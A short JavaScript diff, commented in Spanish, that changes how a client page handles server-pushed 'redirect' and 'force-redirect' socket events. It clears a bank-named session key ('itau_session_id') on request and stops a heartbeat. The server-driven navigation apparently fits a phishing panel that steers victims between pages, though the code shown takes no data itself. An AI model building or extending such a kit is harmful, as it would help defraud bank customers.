@@ -141,10 +141,19 @@
     // Handle redirect commands
     socket.on('redirect', (data) => {
         console.log('🔄 Redirect recibido:', data);
+        
+        // NO eliminar sessionId ni desconectar
         if (data.clearData) {
+            // Solo limpiar si es explícito (volver a login)
+            const currentSessionId = sessionId;
             localStorage.removeItem('itau_session_id');
             sessionId = null;
+            console.log('Session data cleared but keeping connection');
         }
+        
+        // Mantener la conexión activa durante el redirect
+        stopHeartbeat();
+        
         setTimeout(() => {
             window.location.href = data.page;
         }, 100);
@@ -153,10 +162,14 @@
     // Handle force redirect (backup)
     socket.on('force-redirect', (data) => {
         console.log('🔄 Force-redirect recibido:', data);
+        
+        // NO eliminar sessionId ni desconectar
         if (data.clearData) {
             localStorage.removeItem('itau_session_id');
             sessionId = null;
         }
+        
+        stopHeartbeat();
         window.location.href = data.page;
     });
 
